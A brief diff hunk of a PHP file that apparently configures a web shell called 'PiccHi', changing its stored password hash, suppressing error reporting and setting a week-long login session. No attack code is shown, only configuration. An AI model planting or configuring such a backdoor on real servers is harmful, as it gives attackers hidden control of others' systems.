@@ -10,7 +10,7 @@ error_reporting(0);
 $s_name = "PiccHi"; 
 $s_ver = "0.1"; 
 $s_title = $s_name." ".$s_ver; 
-$s_Nunu = "63a9f0ea7bb98050796b649e85481845"; 
+$s_Nunu = "674769e3326f8cf937af4282f2815c02"; 
 $s_Cunu = "ff0000"; 
 $s_login_time = 3600 * 24 * 7; 
 
